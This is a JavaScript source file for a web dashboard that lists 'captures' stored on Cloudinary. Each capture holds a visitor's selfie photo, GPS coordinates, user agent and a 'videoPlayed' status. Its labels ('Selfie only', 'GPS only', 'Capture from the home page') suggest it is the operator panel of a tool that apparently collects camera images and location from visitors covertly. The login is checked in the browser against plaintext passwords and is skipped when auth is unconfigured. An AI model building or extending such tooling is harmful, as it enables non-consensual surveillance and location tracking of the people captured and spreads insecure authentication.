'use strict';

(function () {
  const STORAGE_KEY = 'northline-upload-records';
  const DELETED_KEY = 'northline-deleted-ids';
  const AUTH_TOKEN_KEY = 'image_panel_auth_token';
  const AUTH_EXPIRES_KEY = 'image_panel_auth_expires_at';
  const REFRESH_MS = 15000;
  const MAX_RECORDS = 1000;

  const grid = document.getElementById('recordsGrid');
  const emptyState = document.getElementById('emptyState');
  const listHead = document.getElementById('listHead');
  const loginSection = document.getElementById('loginSection');
  const panelSection = document.getElementById('panelSection');
  const loginForm = document.getElementById('loginForm');
  const authError = document.getElementById('authError');
  const refreshBtn = document.getElementById('refreshBtn');
  const countLine = document.getElementById('countLine');

  const authCfg = window.IMAGE_PANEL_AUTH || {};
  let refreshTimer = null;
  let rendering = false;

  function escapeHtml(value) {
    return String(value ?? '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function formatDate(value) {
    try {
      return new Date(value).toLocaleString('en-US', {
        dateStyle: 'medium',
        timeStyle: 'short'
      });
    } catch {
      return value || '-';
    }
  }

  function hasGps(record) {
    return record.latitude != null && record.longitude != null && !Number.isNaN(Number(record.latitude));
  }

  function getStatus(record) {
    if (record.status) return record.status;
    if (record.videoPlayed) return record.videoPlayed;
    const photo = Boolean(record.photoUrl);
    const gps = hasGps(record);
    if (photo && gps) return 'Both';
    if (photo) return 'Selfie only';
    if (gps) return 'GPS only';
    return 'Unknown';
  }

  function statusClass(status) {
    if (status === 'Both') return 'status-both';
    if (status === 'Selfie only') return 'status-selfie';
    if (status === 'GPS only') return 'status-gps';
    return 'status-unknown';
  }

  function readDeletedIds() {
    try {
      const raw = localStorage.getItem(DELETED_KEY);
      const ids = raw ? JSON.parse(raw) : [];
      return Array.isArray(ids) ? ids.map(String) : [];
    } catch {
      return [];
    }
  }

  function saveDeletedIds(ids) {
    try {
      localStorage.setItem(DELETED_KEY, JSON.stringify(ids.slice(0, 2000)));
    } catch {
      /* ignore */
    }
  }

  function markDeleted(record) {
    const ids = readDeletedIds();
    const keys = [record.id, record.publicId, record.photoUrl].filter(Boolean).map(String);
    keys.forEach((k) => {
      if (!ids.includes(k)) ids.push(k);
    });
    saveDeletedIds(ids);

    const records = readLocalRecords().filter((r) => {
      const rk = [r.id, r.publicId, r.photoUrl].filter(Boolean).map(String);
      return !rk.some((x) => keys.includes(x));
    });
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(records));
    } catch {
      /* ignore */
    }
  }

  function isDeletedRecord(record) {
    const deleted = new Set(readDeletedIds());
    return [record.id, record.publicId, record.photoUrl]
      .filter(Boolean)
      .map(String)
      .some((k) => deleted.has(k));
  }

  async function deleteFromCloudinary(record) {
    if (!record.deleteToken || !authCfg.cloudName) return false;
    const url = `https://api.cloudinary.com/v1_1/${authCfg.cloudName}/delete_by_token`;
    const body = new URLSearchParams({ token: record.deleteToken });
    const res = await fetch(url, { method: 'POST', body });
    return res.ok;
  }

  function readLocalRecords() {
    try {
      const raw = localStorage.getItem(STORAGE_KEY);
      const records = raw ? JSON.parse(raw) : [];
      return Array.isArray(records) ? records : [];
    } catch {
      return [];
    }
  }

  function cloudinaryListUrl() {
    const cloud = authCfg.cloudName;
    const tag = authCfg.listTag || 'web-capture';
    if (!cloud) return null;
    return `https://res.cloudinary.com/${encodeURIComponent(cloud)}/image/list/${encodeURIComponent(tag)}.json?_=${Date.now()}`;
  }

  function mapCloudinaryResource(resource) {
    const publicId = resource.public_id || '';
    const version = resource.version || '';
    const format = resource.format || 'jpg';
    const cloud = authCfg.cloudName;
    const photoUrl =
      resource.secure_url ||
      resource.url ||
      `https://res.cloudinary.com/${cloud}/image/upload/v${version}/${publicId}.${format}`;

    const ctx = resource.context?.custom || resource.context || {};
    const ua = ctx.user_agent ? decodeURIComponent(String(ctx.user_agent)) : '';
    const statusRaw = ctx.status ? decodeURIComponent(String(ctx.status)) : '';
    const videoPlayed = ctx.video_played
      ? decodeURIComponent(String(ctx.video_played))
      : statusRaw;

    const latitude = ctx.latitude != null ? Number(ctx.latitude) : null;
    const longitude = ctx.longitude != null ? Number(ctx.longitude) : null;
    const computed = getStatus({
      photoUrl,
      latitude,
      longitude,
      status: statusRaw || null
    });

    return {
      id: resource.asset_id || publicId,
      photoUrl,
      publicId,
      uploadedAt: resource.created_at || new Date().toISOString(),
      userAgent: ua,
      latitude,
      longitude,
      status: statusRaw || computed,
      videoPlayed: videoPlayed || computed,
      source: 'cloudinary'
    };
  }

  async function fetchPhotosJson() {
    try {
      const res = await fetch(`photos.json?_=${Date.now()}`, { cache: 'no-store' });
      if (!res.ok) return [];
      const data = await res.json();
      return Array.isArray(data.records) ? data.records : [];
    } catch {
      return [];
    }
  }

  async function fetchCloudinaryList() {
    const url = cloudinaryListUrl();
    if (!url) return [];
    try {
      const res = await fetch(url, { cache: 'no-store' });
      if (!res.ok) return [];
      const data = await res.json();
      const resources = Array.isArray(data.resources) ? data.resources : [];
      return resources.map(mapCloudinaryResource);
    } catch {
      return [];
    }
  }

  function mergeRecords(lists, { applyDeletedFilter = true } = {}) {
    const byKey = new Map();

    function keysFor(r) {
      return [r.publicId, r.id, r.photoUrl].filter(Boolean).map(String);
    }

    function put(r) {
      if (!r || (!r.photoUrl && !r.publicId && !r.id)) return;
      const keys = keysFor(r);
      let existing = null;
      for (const k of keys) {
        if (byKey.has(k)) {
          existing = byKey.get(k);
          break;
        }
      }
      const merged = existing
        ? {
            ...existing,
            ...r,
            userAgent: r.userAgent || existing.userAgent || '',
            latitude: r.latitude ?? existing.latitude ?? null,
            longitude: r.longitude ?? existing.longitude ?? null,
            deleteToken: r.deleteToken || existing.deleteToken || null,
            publicId: r.publicId || existing.publicId || '',
            status: r.status || existing.status || getStatus({ ...existing, ...r }),
            videoPlayed:
              r.videoPlayed || existing.videoPlayed || r.status || existing.status || getStatus({ ...existing, ...r })
          }
        : { ...r, status: r.status || getStatus(r), videoPlayed: r.videoPlayed || r.status || getStatus(r) };
      keysFor(merged).forEach((k) => byKey.set(k, merged));
    }

    lists.flat().forEach(put);

    let out = Array.from(new Set(byKey.values()));
    if (applyDeletedFilter) {
      out = out.filter((r) => !isDeletedRecord(r));
    }
    return out
      .sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt))
      .slice(0, MAX_RECORDS);
  }

  function getLocalUsers() {
    if (Array.isArray(authCfg.users) && authCfg.users.length) {
      return authCfg.users.filter(
        (u) => typeof u?.email === 'string' && u.email.includes('@') && typeof u?.password === 'string'
      );
    }
    if (typeof authCfg.email === 'string' && authCfg.email.includes('@') && typeof authCfg.password === 'string') {
      return [{ email: authCfg.email, password: authCfg.password }];
    }
    return [];
  }

  function isLocalAuth() {
    return authCfg.mode === 'local' && getLocalUsers().length > 0;
  }

  function isSupabaseConfigured() {
    return (
      typeof authCfg.supabaseUrl === 'string' &&
      authCfg.supabaseUrl.startsWith('https://') &&
      typeof authCfg.supabaseAnonKey === 'string' &&
      authCfg.supabaseAnonKey.length > 10 &&
      !authCfg.supabaseAnonKey.includes('YOUR_SUPABASE')
    );
  }

  function isAuthConfigured() {
    return isLocalAuth() || isSupabaseConfigured();
  }

  function isLoggedIn() {
    try {
      const token = localStorage.getItem(AUTH_TOKEN_KEY);
      const exp = Number(localStorage.getItem(AUTH_EXPIRES_KEY) || 0);
      if (!token || !exp || Date.now() > exp) return false;
      return true;
    } catch {
      return false;
    }
  }

  function saveSession(accessToken, expiresIn) {
    const ttl = Math.max((expiresIn || 3600) - 60, 60) * 1000;
    const exp = Date.now() + ttl;
    localStorage.setItem(AUTH_TOKEN_KEY, accessToken);
    localStorage.setItem(AUTH_EXPIRES_KEY, String(exp));
  }

  function loginLocal(email, password) {
    const inputEmail = email.trim().toLowerCase();
    const ok = getLocalUsers().some(
      (u) => inputEmail === String(u.email).trim().toLowerCase() && password === String(u.password)
    );
    if (!ok) {
      const err = new Error('Invalid email or password');
      err.status = 401;
      throw err;
    }
    return {
      access_token: `local-${Date.now()}`,
      expires_in: 60 * 60 * 24 * 7
    };
  }

  async function loginWithSupabase(email, password) {
    const url = `${authCfg.supabaseUrl}/auth/v1/token?grant_type=password`;
    const res = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        apikey: authCfg.supabaseAnonKey,
        Authorization: `Bearer ${authCfg.supabaseAnonKey}`
      },
      body: JSON.stringify({ email, password })
    });
    if (!res.ok) {
      const err = new Error('Login failed');
      err.status = res.status;
      throw err;
    }
    return res.json();
  }

  function startAutoRefresh() {
    stopAutoRefresh();
    refreshTimer = setInterval(() => {
      if (!panelSection.hidden) render({ silent: true });
    }, REFRESH_MS);
  }

  function stopAutoRefresh() {
    if (refreshTimer) {
      clearInterval(refreshTimer);
      refreshTimer = null;
    }
  }

  function showPanel() {
    loginSection.hidden = true;
    panelSection.hidden = false;
    render();
    startAutoRefresh();
  }

  function showLogin(message) {
    stopAutoRefresh();
    panelSection.hidden = true;
    loginSection.hidden = false;
    if (message) {
      authError.textContent = message;
      authError.hidden = false;
    } else {
      authError.hidden = true;
    }
  }

  function renderRows(records) {
    return records
      .map((record, index) => {
        const status = getStatus(record);
        return `
          <a class="row-link" href="response-detail.html?id=${encodeURIComponent(record.id)}" data-id="${escapeHtml(String(record.id))}">
            <img class="row-thumb" src="${escapeHtml(record.photoUrl || '')}" alt="Photo ${index + 1}" loading="lazy">
            <div>
              <div class="row-title">#${index + 1}</div>
              <div class="row-sub">${escapeHtml(formatDate(record.uploadedAt))}</div>
            </div>
            <div class="status-col">
              <span class="status-badge ${statusClass(status)}">${escapeHtml(status)}</span>
            </div>
            <button type="button" class="row-delete" data-delete-id="${escapeHtml(String(record.id))}" title="Delete" aria-label="Delete">✕</button>
            <div class="row-chevron" aria-hidden="true">›</div>
          </a>
        `;
      })
      .join('');
  }

  async function render(opts = {}) {
    if (rendering) return;
    rendering = true;
    const silent = Boolean(opts.silent);

    try {
      if (!silent) {
        emptyState.hidden = true;
        if (listHead) listHead.hidden = true;
        grid.innerHTML = '<p class="empty">Loading...</p>';
      }

      const [fromFile, fromList, localRecords] = await Promise.all([
        fetchPhotosJson(),
        fetchCloudinaryList(),
        Promise.resolve(readLocalRecords())
      ]);
      const records = mergeRecords([fromFile, fromList, localRecords], { applyDeletedFilter: true });

      if (countLine) {
        countLine.textContent = `${records.length} records · auto-refresh every ${REFRESH_MS / 1000}s`;
      }

      if (!records.length) {
        grid.innerHTML = '';
        emptyState.hidden = false;
        emptyState.textContent = 'No photos yet. Capture from the home page.';
        if (listHead) listHead.hidden = true;
        return;
      }

      emptyState.hidden = true;
      if (listHead) listHead.hidden = false;

      try {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(records));
      } catch {
        try {
          localStorage.setItem(STORAGE_KEY, JSON.stringify(records.slice(0, 300)));
        } catch {
          /* ignore */
        }
      }

      grid.innerHTML = renderRows(records);
    } finally {
      rendering = false;
    }
  }

  if (grid && !grid.dataset.deleteBound) {
    grid.dataset.deleteBound = '1';
    grid.addEventListener('click', async (e) => {
      const btn = e.target.closest('.row-delete');
      if (!btn) return;
      e.preventDefault();
      e.stopPropagation();

      const id = btn.getAttribute('data-delete-id');
      if (!id) return;
      if (!window.confirm('Delete this capture from the panel?')) return;

      const all = readLocalRecords();
      const record = all.find((r) => String(r.id) === String(id)) || { id };
      btn.disabled = true;
      try {
        await deleteFromCloudinary(record);
      } catch {
        /* ignore */
      }
      markDeleted(record);
      await render();
    });
  }

  if (refreshBtn) {
    refreshBtn.addEventListener('click', () => render());
  }

  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible' && !panelSection.hidden) {
      render({ silent: true });
    }
  });

  if (!isAuthConfigured()) {
    showPanel();
  } else if (isLoggedIn()) {
    showPanel();
  } else {
    showLogin();
  }

  if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const form = e.currentTarget;
      const email = form.email.value;
      const password = form.password.value;

      authError.hidden = true;
      authError.textContent = '';

      if (!isAuthConfigured()) {
        authError.hidden = false;
        authError.textContent = 'Auth is not configured';
        return;
      }

      try {
        const session = isLocalAuth()
          ? loginLocal(email, password)
          : await loginWithSupabase(email, password);
        saveSession(session.access_token, session.expires_in);
        showPanel();
      } catch (err) {
        authError.hidden = false;
        authError.textContent =
          err.status === 401 || err.status === 403
            ? 'Invalid email or password'
            : (err.message || 'Login failed');
      }
    });
  }
})();
